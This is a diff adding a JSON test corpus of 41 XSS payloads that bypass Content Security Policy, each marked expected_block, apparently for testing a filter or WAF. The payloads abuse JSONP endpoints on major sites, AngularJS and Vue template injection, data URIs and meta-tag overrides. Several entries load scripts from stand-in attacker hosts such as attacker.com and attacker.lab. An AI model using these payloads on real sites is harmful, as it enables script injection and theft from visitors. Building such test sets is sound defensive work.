@@ -1,0 +1,431 @@
+[
+  {
+      "id": "XSS-CSP-100",
+      "payload": "<script nonce=\"abc123\">alert(1)</script>",
+      "tags": [
+        "csp-bypass",
+        "nonce-prediction",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via predictable nonce value",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-101",
+      "payload": "<link rel=preload href=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js\"><div ng-app ng-csp><textarea autofocus ng-focus=\"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'\" ></textarea></div>",
+      "tags": [
+        "csp-bypass",
+        "angular",
+        "ng-csp"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via AngularJS ng-csp mode",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-102",
+      "payload": "<script src=\"https://www.google.com/jsapi?callback=alert\"></script>",
+      "tags": [
+        "csp-bypass",
+        "jsonp",
+        "google"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Google JSONP endpoint",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-103",
+      "payload": "<script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert\"></script>",
+      "tags": [
+        "csp-bypass",
+        "jsonp",
+        "google-oauth"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Google OAuth JSONP callback",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-104",
+      "payload": "<script src=\"https://www.googletagmanager.com/gtm.js?id=GTM-callback&l=alert\"></script>",
+      "tags": [
+        "csp-bypass",
+        "jsonp",
+        "google-tag-manager"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "CSP bypass via Google Tag Manager callback",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-105",
+      "payload": "<base href=\"javascript://\"><a href=\"alert(1)\">click</a>",
+      "tags": [
+        "csp-bypass",
+        "base-uri",
+        "base-tag"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via base tag hijacking (if base-uri not set)",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-106",
+      "payload": "<object data=\"data:text/html,<script>alert(parent.origin)</script>\"></object>",
+      "tags": [
+        "csp-bypass",
+        "object",
+        "data-uri"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via object with data URI",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-107",
+      "payload": "<embed src=\"data:text/html,<script>alert(1)</script>\"></embed>",
+      "tags": [
+        "csp-bypass",
+        "embed",
+        "data-uri"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "CSP bypass via embed with data URI",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-108",
+      "payload": "<meta http-equiv=\"refresh\" content=\"0; url=data:text/html,<script>alert(1)</script>\">",
+      "tags": [
+        "csp-bypass",
+        "meta-refresh",
+        "data-uri"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via meta refresh to data URI",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-109",
+      "payload": "<iframe srcdoc=\"<script>alert(parent.origin)</script>\"></iframe>",
+      "tags": [
+        "csp-bypass",
+        "iframe",
+        "srcdoc"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via iframe srcdoc (inherits parent CSP)",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-110",
+      "payload": "<script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js\"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
+      "tags": [
+        "csp-bypass",
+        "angular",
+        "constructor"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via AngularJS constructor in CSP mode",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-111",
+      "payload": "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">",
+      "tags": [
+        "csp-bypass",
+        "html-import",
+        "data-uri"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "CSP bypass via HTML import with data URI",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-112",
+      "payload": "<script>location='data:text/html,<script>alert(origin)</script>'</script>",
+      "tags": [
+        "csp-bypass",
+        "location",
+        "data-uri"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via location assignment to data URI",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-113",
+      "payload": "<script src=\"//cdn.jsdelivr.net/npm/vue/dist/vue.js\"></script><div id=app>{{_c.constructor('alert(1)')()}}</div><script>new Vue({el:'#app'})</script>",
+      "tags": [
+        "csp-bypass",
+        "vue",
+        "constructor"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Vue.js constructor access",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-114",
+      "payload": "<script src=\"https://cdn.jsdelivr.net/npm/requirejs@2.3.6/require.js\"></script><script>require(['https://attacker.com/evil.js'])</script>",
+      "tags": [
+        "csp-bypass",
+        "requirejs",
+        "amd"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via RequireJS dynamic module loading",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-115",
+      "payload": "<script src=\"//google.com/complete/search?client=chrome&jsonp=alert(1);\">",
+      "tags": ["csp-bypass", "jsonp", "google"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Google Search JSONP callback",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-116",
+      "payload": "<script src=\"https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();\"></script>",
+      "tags": ["csp-bypass", "jsonp", "google-translate"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Google Translate API JSONP",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-117",
+      "payload": "<script src=\"https://www.youtube.com/oembed?callback=alert;\"></script>",
+      "tags": ["csp-bypass", "jsonp", "youtube"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via YouTube oEmbed JSONP",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-118",
+      "payload": "<script src=\"https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)\"></script>",
+      "tags": ["csp-bypass", "jsonp", "blogger"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Blogger JSONP callback",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-119",
+      "payload": "<script src=\"https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)\"></script>",
+      "tags": ["csp-bypass", "jsonp", "yandex"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Yandex Translate JSONP",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-120",
+      "payload": "<script src=\"https://api.vk.com/method/wall.get?callback=alert(1337)\"></script>",
+      "tags": ["csp-bypass", "jsonp", "vk"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via VK API JSONP callback",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-121",
+      "payload": "<script src=\"https://suggest.taobao.com/sug?callback=alert(1337)\"></script>",
+      "tags": ["csp-bypass", "jsonp", "alibaba"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Taobao JSONP callback",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-122",
+      "payload": "<script src=\"https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain);\"></script>",
+      "tags": ["csp-bypass", "jsonp", "uber"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Uber Marketo JSONP",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-123",
+      "payload": "<script src=\"https://appcenter.intuit.com/Account/LogoutJSONP?callback=alert(1337)\"></script>",
+      "tags": ["csp-bypass", "jsonp", "intuit"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Intuit JSONP callback",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-124",
+      "payload": "ng-app\"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>",
+      "tags": ["csp-bypass", "angular", "ng-csp"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via AngularJS ng-csp with event view",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-125",
+      "payload": "<embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>",
+      "tags": ["csp-bypass", "flash", "swf"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Flash SWF allowScriptAccess",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-126",
+      "payload": "<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>",
+      "tags": ["csp-bypass", "jsonp", "google-ajax"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Google AJAX API feed JSONP",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-127",
+      "payload": "f=document.createElement(\"iframe\");f.id=\"pwn\";f.src=\"/robots.txt\";f.onload=()=>{x=document.createElement('script');x.src='//attacker.lab/csp.js';pwn.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);",
+      "tags": ["csp-bypass", "iframe", "default-src"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP default-src bypass via iframe script injection",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-128",
+      "payload": "script=document.createElement('script');script.src='//attacker.lab/csp.js';window.frames[0].document.head.appendChild(script);",
+      "tags": ["csp-bypass", "frames", "dynamic-script"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via frame document script append",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-129",
+      "payload": "<script src=\"data:,alert(1)\">/</script>",
+      "tags": ["csp-bypass", "data-uri", "script-src"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP script-src data: bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-130",
+      "payload": "/?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a&a",
+      "tags": ["csp-bypass", "php-warning", "header-bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via PHP max_input_vars warning",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-131",
+      "payload": "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self' 'unsafe-inline'\">",
+      "tags": ["csp-bypass", "meta-tag", "csp-override"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP override attempt via meta tag injection",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-132",
+      "payload": "<script src=\"https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)\"></script>",
+      "tags": ["csp-bypass", "jsonp", "sharethis"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via ShareThis JSONP callback",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-133",
+      "payload": "<script src=\"https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)\"></script>",
+      "tags": ["csp-bypass", "jsonp", "addthis"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via AddThis JSONP callback",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-134",
+      "payload": "<script src=\"https://api.twitter.com/1/statuses/oembed.json?callback=alert\"></script>",
+      "tags": ["csp-bypass", "jsonp", "twitter"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Twitter oEmbed JSONP",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-135",
+      "payload": "{{0[a='constructor'][a]('alert(1)')()}}",
+      "tags": ["csp-bypass", "angular", "csti"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AngularJS CSTI CSP bypass via constructor",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-136",
+      "payload": "{{$eval.constructor('alert(1)')()}}",
+      "tags": ["csp-bypass", "angular", "eval-constructor"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AngularJS $eval.constructor CSP bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-137",
+      "payload": "{{$on.constructor('alert(1)')()}}",
+      "tags": ["csp-bypass", "angular", "on-constructor"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AngularJS $on.constructor CSP bypass",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-138",
+      "payload": "{{constructor.constructor('alert(1)')()}}",
+      "tags": ["csp-bypass", "angular", "vue", "constructor-chain"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AngularJS 1.0.1-1.1.5 and Vue constructor chain",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-139",
+      "payload": "<link rel=\"preload\" as=\"script\" href=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js\"><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>",
+      "tags": ["csp-bypass", "angular", "preload"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via Angular preload with CSTI",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-CSP-140",
+      "payload": "<script src=\"https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)\"></script>",
+      "tags": ["csp-bypass", "jsonp", "doubleclick"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "CSP bypass via DoubleClick JSONP callback",
+      "category": "XSS"
+  }
+]
